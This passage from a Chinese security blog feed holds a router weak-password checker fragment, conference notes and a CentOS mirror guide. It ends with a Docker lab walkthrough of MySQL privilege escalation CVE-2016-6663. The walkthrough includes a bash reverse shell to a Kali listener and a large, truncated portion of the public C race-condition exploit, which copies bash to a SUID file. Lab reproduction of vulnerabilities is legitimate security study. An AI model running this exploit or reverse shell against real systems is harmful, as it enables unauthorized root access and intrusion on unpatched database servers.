<span class="number">200</span> <span class="keyword">and</span> <span class="string">&#x27;WebCLI&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                <span class="built_in">print</span>(url1+<span class="string">&#x27;NBR路由器存在弱口令：guest/guest&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(url1+<span class="string">&#x27;NBR路由器不存在弱口令&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(url1+<span class="string">&#x27;异常&#x27;</span>)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
  </entry>
  <entry>
    <title>北京ISC网络安全大会</title>
    <url>/2021/10/30/%E5%8C%97%E4%BA%ACISC%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E4%BC%9A/</url>
    <content><![CDATA[<hr>
<p>北京，</p>
<p>是一座你来了便不会忘记的城市。</p>
<p>这座昔日的古都，</p>
<p>如今又成为人们所关注和向往的地方。</p>
<hr>
<span id="more"></span>

<h2 id="云安全联盟CISO高峰论坛"><a href="#云安全联盟CISO高峰论坛" class="headerlink" title="云安全联盟CISO高峰论坛"></a>云安全联盟CISO高峰论坛</h2><h3 id="数字化转型"><a href="#数字化转型" class="headerlink" title="数字化转型"></a>数字化转型</h3><p>数字化转型是一个产业，是指经营的数字经济时代，在领域内的价值创造（用户体验、业务增长、商业模式等），也就是新一代的网络化、数字化、智能化技术。</p>
<p>分词理解：数字化=手段；转=战术（方法）+实践；转型=目标。</p>
<p>个人见解：数字化转型产业已然来临，如银行。虚拟世界(计算机)与生物世界（人、动物）相结合的时代，做好数字化安全是很有必要的，方向可以是增强甲方业务主机保护能力（防御提升、支持热响应，即发现攻击后不仅只是检测，还能直接阻断或是修复，做到这样的技术类似是“火眼”的EDR“回滚”操作，类似快照还原的功能）、增强用户体验等。</p>
<h3 id="一横三纵方针"><a href="#一横三纵方针" class="headerlink" title="一横三纵方针"></a>一横三纵方针</h3><p>以业务为主线，牢牢把握“科技·安全·生态”三大核心立足点。</p>
<p>业务&gt;科技&gt;安全。</p>
<h3 id="数智化安全能力框架"><a href="#数智化安全能力框架" class="headerlink" title="数智化安全能力框架"></a>数智化安全能力框架</h3><p>（城市比作业务，把操作业务运行的人【老板】比作市长）。</p>
<p><strong>数字化业务安全</strong>：线上交易安全、隐私保护、反欺诈、内容安全、智慧城市安全……；</p>
<p><strong>数字化科技安全</strong>：大数据安全、AI安全、物联网安全（万物皆可互联）、区块链安全、工业互联网安全……；</p>
<p><strong>数字化基础设施安全</strong>：云原生安全、零信任、主机安全、应用安全……。</p>
<h3 id="SASE"><a href="#SASE" class="headerlink" title="SASE"></a>SASE</h3><ol>
<li>利用CDN/VPN等产品提供部分云化安全能力（如抗D）；</li>
<li>传统安全厂商，提供订阅服务；</li>
<li>基于零信任产品改造。</li>
</ol>
<h3 id="数字化安全体系建设实践"><a href="#数字化安全体系建设实践" class="headerlink" title="数字化安全体系建设实践"></a>数字化安全体系建设实践</h3><p>安全意识、零信任——安全实践、安全工具与方法——安全过程自动化、安全流程IT化、安全团队建设、安全知识库建设——应急响应、循环改造</p>
<h3 id="数字化安全未来方向"><a href="#数字化安全未来方向" class="headerlink" title="数字化安全未来方向"></a>数字化安全未来方向</h3><p>客户信任、零信任架构、自动化安全、数字化可信。</p>
<h3 id="基于云化的数据安全解决方案思路"><a href="#基于云化的数据安全解决方案思路" class="headerlink" title="基于云化的数据安全解决方案思路"></a>基于云化的数据安全解决方案思路</h3><p><strong>综合治理平台</strong>：策略采集——策略处置——策略联动——策略下发；</p>
<p><strong>统一策略平台</strong>：数据库审计——资产梳理——终端防泄露——数据库防火墙/加密——堡垒机——统一身份管理。</p>
<h2 id="信创安全技术与应用"><a href="#信创安全技术与应用" class="headerlink" title="信创安全技术与应用"></a>信创安全技术与应用</h2><h3 id="安全运营体系"><a href="#安全运营体系" class="headerlink" title="安全运营体系"></a>安全运营体系</h3><p>资产清单——资产监控——资产判定——资产处置——安全恢复——处置报告。安全检测：</p>
<p>漏扫工具——渗透测试——代码审计——安全测试——互联网监控。</p>
<p><strong>底层采集：</strong>安全工具、系统日志、网络日志、应用日志。</p>
<p><strong>三道防线：</strong>安全测试全覆盖、强化渗透测试、全天候SRC众测。</p>
<h2 id="云安全联盟CISO高峰论坛-1"><a href="#云安全联盟CISO高峰论坛-1" class="headerlink" title="云安全联盟CISO高峰论坛"></a>云安全联盟CISO高峰论坛</h2><h3 id="网络安全运营实践"><a href="#网络安全运营实践" class="headerlink" title="网络安全运营实践"></a>网络安全运营实践</h3><p>综合分析研判、主动防御、监控发现、基础安全支持。</p>
<p>SDL管控服务平台：安全左移、适配DevSecOps(集成工具、提供自动审计功能)，安全Wiki建设、数据采集能力、数据分析能力。</p>
<h3 id="情报能力建设"><a href="#情报能力建设" class="headerlink" title="情报能力建设"></a>情报能力建设</h3><p>威胁发现——攻击意图挖掘——设备赋能；</p>
<p>情报聚合、情报分发、展示——沙箱集群、知识推理、分类、蜜罐日志、情报线索、告警日志。</p>
<h3 id="应急处置能力"><a href="#应急处置能力" class="headerlink" title="应急处置能力"></a>应急处置能力</h3><p>安全编排与自动化响应平台。</p>
<p>案件管理——安全编排与自动化——告警管理=综合分析平台——CMDB——UEBA</p>
<h3 id="网络安全态势检测"><a href="#网络安全态势检测" class="headerlink" title="网络安全态势检测"></a>网络安全态势检测</h3><p>活跃设备检测——扫描探测活跃检测——恶意攻击代码检测——重点业务安全态势检测——事件检测。</p>
<h3 id="关联分析"><a href="#关联分析" class="headerlink" title="关联分析"></a>关联分析</h3><p>三个关键词：机器学习功能算法、业务数据、威胁事件。</p>
<h2 id="CSO高峰论坛"><a href="#CSO高峰论坛" class="headerlink" title="CSO高峰论坛"></a>CSO高峰论坛</h2><h3 id="安全态势全景，挑战持续变化。"><a href="#安全态势全景，挑战持续变化。" class="headerlink" title="安全态势全景，挑战持续变化。"></a>安全态势全景，挑战持续变化。</h3><p>攻击团队持续专业化、攻击手段持续更新、数据安全风险持续、损失持续扩大。</p>
<p>篡改、仿冒、诈骗持续增长，成为热点标题。</p>
<p>可持续网络安全运营的团队组织，服务团队、运营团队、技术支撑团队。</p>
<h3 id="云原生安全"><a href="#云原生安全" class="headerlink" title="云原生安全"></a>云原生安全</h3><p>传统的攻击方式对容器同样有效，内核漏洞逃逸等、配置安全、计算、网络运行环境安全、CI/CD安全、镜像安全等。</p>
<p>解决方案：平行容器+主机agent，镜像安全扫描+镜像运行时阻断。</p>
<h3 id="特权账号管理"><a href="#特权账号管理" class="headerlink" title="特权账号管理"></a>特权账号管理</h3><p>思路：识别（资产、账户收集）——防御（身份认证、访问控制）——检测（弱口令检测）——响应——恢复（账号台账、物理设备恢复）。</p>
<h2 id="ATT-amp-CK安全能力衡量论坛"><a href="#ATT-amp-CK安全能力衡量论坛" class="headerlink" title="ATT&amp;CK安全能力衡量论坛"></a>ATT&amp;CK安全能力衡量论坛</h2><h3 id="实战驱动的网络安全方法论。"><a href="#实战驱动的网络安全方法论。" class="headerlink" title="实战驱动的网络安全方法论。"></a>实战驱动的网络安全方法论。</h3><p><strong>攻击者视角全景框架</strong>：网络杀伤力框架（洛克希德-马丁）、入侵者技术战术知识框架（MITRE）、公共网络威胁框架(美国国家情报)、技术性网络威胁框架（美国国家安全局）;<br><strong>防御者视角全景框架</strong>：网络安全框架（NIST）、主动防御框架（MITRE）、社区防御模型（CIS）、网络安全对策知识图谱。能力视角成熟度：网络安全成熟度模型认证，CMMC（美国国防部）、CMM2（美国能源部）。<br><strong>确保三个元素的关联性</strong>：攻击框架（CTF/TCTF/ATT&amp;CK）——防御框架（NIST CSF/SHIELD/MITRE/D3FEND）——成熟度模型（CMMC、CMM2）。</p>
<p>360全景攻防知识图谱：兼容ATT&amp;CK模型（杀伤链攻击全景）——攻击战术、攻击实体元素、关系模型、攻击检测规则、APT组织——应急预案（漏洞和受影响的资产）。<br>360网络安全防御框架：进攻反制——情报运营——主动防御（框架覆盖，shield、d3fend）——被动防御。<br>360成熟度模型：获得能力——积攒能力——提升能力——输出能力。<br>个人见解：继续深、广化ATT&amp;CK防御能力，研究shield、d3fend框架，构建知识库。</p>
]]></content>
      <categories>
        <category>网络安全大会</category>
      </categories>
  </entry>
  <entry>
    <title>CentOS更换yum源和pip源</title>
    <url>/2021/11/05/CentOS%E6%9B%B4%E6%8D%A2yum%E6%BA%90%E5%92%8Cpip%E6%BA%90/</url>
    <content><![CDATA[<h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><hr>
<p>CentOS，是基于 Red Hat Linux 提供的可自由使用源代码的企业级 Linux 发行版本；是一个稳定，可预测，可管理和可复制的免费企业级计算平台。</p>
<ul>
<li>参考：<a href="https://www.hackliu.com/?p=603">https://www.hackliu.com/?p=603</a></li>
</ul>
<hr>
<span id="more"></span>

<h2 id="更换yum源"><a href="#更换yum源" class="headerlink" title="更换yum源"></a>更换yum源</h2><h3 id="备份"><a href="#备份" class="headerlink" title="备份"></a>备份</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.backup</span><br></pre></td></tr></table></figure>

<h3 id="CentOS-6"><a href="#CentOS-6" class="headerlink" title="CentOS 6"></a>CentOS 6</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-6.repo</span><br><span class="line">curl -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-6.repo</span><br></pre></td></tr></table></figure>

<h3 id="CentOS-7"><a href="#CentOS-7" class="headerlink" title="CentOS 7"></a>CentOS 7</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo</span><br><span class="line">curl -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo</span><br></pre></td></tr></table></figure>

<h3 id="CentOS-8"><a href="#CentOS-8" class="headerlink" title="CentOS 8"></a>CentOS 8</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-8.repo</span><br><span class="line">curl -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-8.repo</span><br></pre></td></tr></table></figure>

<h3 id="缓存-amp-更新"><a href="#缓存-amp-更新" class="headerlink" title="缓存&amp;更新"></a>缓存&amp;更新</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum clean all</span><br><span class="line">yum makecache</span><br><span class="line">yum update</span><br></pre></td></tr></table></figure>

<h2 id="更换pip源"><a href="#更换pip源" class="headerlink" title="更换pip源"></a>更换pip源</h2><p>临时使用;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install some-package -i https://mirrors.aliyun.com/pypi/simple/</span><br></pre></td></tr></table></figure>

<p>设为默认;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install pip -U</span><br><span class="line">pip config set global.index-url https://mirrors.aliyun.com/pypi/simple/</span><br></pre></td></tr></table></figure>

<p>pip源；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 豆瓣</span><br><span class="line">https://pypi.doubanio.com/simple/</span><br><span class="line"></span><br><span class="line"># 阿里云    </span><br><span class="line">https://mirrors.aliyun.com/pypi/simple/</span><br><span class="line"></span><br><span class="line"># 清华大学</span><br><span class="line">https://pypi.tuna.tsinghua.edu.cn/simple/</span><br><span class="line">https://mirrors.tuna.tsinghua.edu.cn/pypi/web/simple/</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>安全运维</category>
      </categories>
  </entry>
  <entry>
    <title>MySQL漏洞提权(CVE-2016-6663)</title>
    <url>/2021/11/04/MySQL%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83(CVE-2016-6663)/</url>
    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><hr>
<p><strong>声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</strong></p>
<p>Mysql之前爆出了CVE-2016-6662、CVE-2016-6663、CVE-2016-6664提权漏洞，影响了Mysql小于5.5.51或小于5.6.32或小于5.7.14及衍生版本。然而好多网站都没有升级，利用场景还是很多的，于是实践一下。</p>
<ul>
<li>参考：<a href="https://www.sqlsec.com/2020/11/mysql.html#toc-heading-31">https://www.sqlsec.com/2020/11/mysql.html#toc-heading-31</a></li>
</ul>
<hr>
<span id="more"></span>

<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><hr>
<p><strong>MariaDB</strong><br>  &lt; 5.5.52<br>  &lt; 10.1.18<br>  &lt; 10.0.28</p>
<p><strong>MySQL</strong><br>  &lt;= 5.5.51<br>  &lt;= 5.6.32<br>  &lt;= 5.7.14</p>
<p>Percona Server<br>  &lt; 5.5.51-38.2<br>  &lt; 5.6.32-78-1<br>  &lt; 5.7.14-8</p>
<p><strong>Percona XtraDB Cluster</strong><br>  &lt; 5.6.32-25.17<br>  &lt; 5.7.14-26.17<br>  &lt; 5.5.41-37.0</p>
<hr>
<h2 id="FOFA语句"><a href="#FOFA语句" class="headerlink" title="FOFA语句"></a>FOFA语句</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">无</span><br></pre></td></tr></table></figure>

<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>docker环境搭建；</p>
<p><a href="https://www.sqlsec.com/">国光</a>师傅已经将漏洞环境封装到了Docker Hub上；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 拉取镜像</span><br><span class="line">docker pull sqlsec/cve-2016-6663</span><br><span class="line"></span><br><span class="line"># 部署镜像</span><br><span class="line">docker run -d -p 3306:3306 -p 8080:80 --name CVE-2016-6663 sqlsec/cve-2016-6663</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211104095443120.png" alt="image-20211104095443120"></p>
<p>添加一个 test 数据库用户，密码为 123456 并赋予一些基础权限：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -uroot -e &quot;create database test;CREATE USER &#x27;test&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;123456&#x27;; grant create,drop,insert,select on test.* to &#x27;test&#x27;@&#x27;%&#x27;;flush privileges;&quot;</span><br></pre></td></tr></table></figure>

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><strong>利用成功条件</strong></p>
<ol>
<li>Getshell 拿到 www-data 权限</li>
<li>拿到 CREATE/INSERT/SELECT 低权限的 MySQL 账户</li>
<li>关键提取步骤需要在交互环境下，所以需要反弹 shell</li>
<li>MySQL 版本需要 &lt;=5.5.51 或 5.6.x &lt;=5.6.32 或 5.7.x &lt;=5.7.14 或 8.x &lt; 8.0.1</li>
<li>MariaDB 版本需要 &lt;= 5.5.51 或 10.0.x &lt;= 10.0.27 或 10.1.x &lt;= 10.1.17</li>
</ol>
<p>php shell 国光师傅已经给出来了访问连接如下：</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211104110457435.png" alt="image-20211104110457435"></p>
<p>通过蚁剑连接shell;</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211104110625042.png" alt="image-20211104110625042"></p>
<p>然后 Bash 反弹 shell：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kali开启nc监听：</span><br><span class="line">nc -lvvp 2333</span><br><span class="line"></span><br><span class="line">在蚁剑终端中执行：</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/kali-ip/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211104111124636.png" alt="image-20211104111124636"></p>
<p>在反弹 shell 的情况下，首先将 <a href="https://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html">EXP</a>使用蚁剑copy到受害机当中，EXP如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">MySQL/Percona/MariaDB - Privilege Escalation / Race Condition PoC Exploit</span></span><br><span class="line"><span class="comment">mysql-privesc-race.c (ver. 1.0)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">CVE-2016-6663 / OCVE-2016-5616</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Discovered/Coded by:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Dawid Golunski</span></span><br><span class="line"><span class="comment">dawid[at]legalhackers.com</span></span><br><span class="line"><span class="comment">https://legalhackers.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Follow https://twitter.com/dawid_golunski for updates on this advisory.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Compile:</span></span><br><span class="line"><span class="comment">gcc mysql-privesc-race.c -o mysql-privesc-race -I/usr/include/mysql -lmysqlclient</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Note:</span></span><br><span class="line"><span class="comment">* On RedHat-based systems you might need to change /tmp to another public directory (e.g. /uploads)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">* For testing purposes only. Do no harm.  </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Full advisory URL:</span></span><br><span class="line"><span class="comment">https://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Video PoC:</span></span><br><span class="line"><span class="comment">https://legalhackers.com/videos/MySQL-MariaDB-PerconaDB-PrivEsc-Race-CVE-2016-6663-5616-6664-5617-Exploits.html</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;grp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;mysql.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pwd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/inotify.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EXP_PATH          <span class="meta-string">&quot;/tmp/mysql_privesc_exploit&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EXP_DIRN          <span class="meta-string">&quot;mysql_privesc_exploit&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MYSQL_TAB_FILE    EXP_PATH <span class="meta-string">&quot;/exploit_table.MYD&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MYSQL_TEMP_FILE   EXP_PATH <span class="meta-string">&quot;/exploit_table.TMD&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SUID_SHELL   	  EXP_PATH <span class="meta-string">&quot;/mysql_suid_shell.MYD&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_DELAY 1000    <span class="comment">// can be used in the race to adjust the timing if necessary</span></span></span><br><span class="line"></span><br><span class="line">MYSQL *conn;		  <span class="comment">// DB handles</span></span><br><span class="line">MYSQL_RES *res;</span><br><span class="line">MYSQL_ROW row;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> cnt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">intro</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>( </span><br><span class="line">        <span class="string">&quot;\033[94m\n&quot;</span></span><br><span class="line">        <span class="string">&quot;MySQL/Percona/MariaDB - Privilege Escalation / Race Condition PoC Exploit\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mysql-privesc-race.c (ver. 1.0)\n\n&quot;</span></span><br><span class="line">        <span class="string">&quot;CVE-2016-6663 / OCVE-2016-5616\n\n&quot;</span></span><br><span class="line">        <span class="string">&quot;For testing purposes only. Do no harm.\n\n&quot;</span></span><br><span class="line">	<span class="string">&quot;Discovered/Coded by:\n\n&quot;</span></span><br><span class="line">	<span class="string">&quot;Dawid Golunski \n&quot;</span></span><br><span class="line">	<span class="string">&quot;http://legalhackers.com&quot;</span></span><br><span class="line">        <span class="string">&quot;\033[0m\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usage</span><span class="params">(<span class="keyword">char</span> *argv0)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">intro</span>();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Usage:\n\n%s user pass db_host database\n\n&quot;</span>, argv0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mysql_cmd</span><span class="params">(<span class="keyword">char</span> *sql_cmd, <span class="keyword">int</span> silent)</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!silent) &#123;</span><br><span class="line">	    <span class="built_in">printf</span>(<span class="string">&quot;%s \n&quot;</span>, sql_cmd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">mysql_query</span>(conn, sql_cmd)) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;%s\n&quot;</span>, <span class="built_in">mysql_error</span>(conn));</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    res = <span class="built_in">mysql_store_result</span>(conn);</span><br><span class="line">    <span class="keyword">if</span> (res&gt;<span class="number">0</span>) <span class="built_in">mysql_free_result</span>(res);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> randomnum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> io_notified = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> myd_handle;</span><br><span class="line">    <span class="keyword">int</span> wpid;</span><br><span class="line">    <span class="keyword">int</span> is_shell_suid=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">    <span class="comment">/* io notify */</span></span><br><span class="line">    <span class="keyword">int</span> fd;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">4096</span>] __attribute__((<span class="built_in">aligned</span>(<span class="number">8</span>)));</span><br><span class="line">    <span class="keyword">int</span> num_read;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">inotify_event</span> *<span class="title">event</span>;</span></span><br><span class="line">    <span class="comment">/* credentials */</span></span><br><span class="line">    <span class="keyword">char</span> *user     = argv[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">char</span> *password = argv[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">char</span> *db_host  = argv[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">char</span> *database = argv[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Disable buffering of stdout</span></span><br><span class="line">    <span class="built_in">setvbuf</span>(stdout, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get the params</span></span><br><span class="line">    <span class="keyword">if</span> (argc!=<span class="number">5</span>) &#123;</span><br><span class="line">	<span class="built_in">usage</span>(argv[<span class="number">0</span>]);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="built_in">intro</span>();</span><br><span class="line">    <span class="comment">// Show initial privileges</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n[+] Starting the exploit as: \n&quot;</span>);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;id&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Connect to the database server with provided credentials</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n[+] Connecting to the database `%s` as %s@%s\n&quot;</span>, database, user, db_host);</span><br><span class="line">    conn = <span class="built_in">mysql_init</span>(<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">mysql_real_connect</span>(conn, db_host, user, password, database, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;%s\n&quot;</span>, <span class="built_in">mysql_error</span>(conn));</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Prepare tmp dir</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n[+] Creating exploit temp directory %s\n&quot;</span>, <span class="string">&quot;/tmp/&quot;</span> EXP_DIRN);</span><br><span class="line">    <span class="built_in">umask</span>(<span class="number">000</span>);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;rm -rf /tmp/&quot;</span> EXP_DIRN <span class="string">&quot; &amp;&amp; mkdir /tmp/&quot;</span> EXP_DIRN);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;chmod g+s /tmp/&quot;</span> EXP_DIRN );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Prepare exploit tables :)</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n[+] Creating mysql tables \n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">mysql_cmd</span>(<span class="string">&quot;DROP TABLE IF EXISTS exploit_table&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">mysql_cmd</span>(<span class="string">&quot;DROP TABLE IF EXISTS mysql_suid_shell&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">mysql_cmd</span>(<span class="string">&quot;CREATE TABLE exploit_table (txt varchar(50)) engine = &#x27;MyISAM&#x27; data directory &#x27;&quot;</span> EXP_PATH <span class="string">&quot;&#x27;&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">mysql_cmd</span>(<span class="string">&quot;CREATE TABLE mysql_suid_shell (txt varchar(50)) engine = &#x27;MyISAM&#x27; data directory &#x27;&quot;</span> EXP_PATH <span class="string">&quot;&#x27;&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy /bin/bash into the mysql_suid_shell.MYD mysql table file</span></span><br><span class="line">    <span class="comment">// The file should be owned by mysql:attacker thanks to the sticky bit on the table directory</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n[+] Copying bash into the mysql_suid_shell table.\n    After the exploitation the following file/table will be assigned SUID and executable bits : \n&quot;</span>);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;cp /bin/bash &quot;</span> SUID_SHELL);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;ls -l &quot;</span> SUID_SHELL);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Use inotify to get the timing right</span></span><br><span class="line">    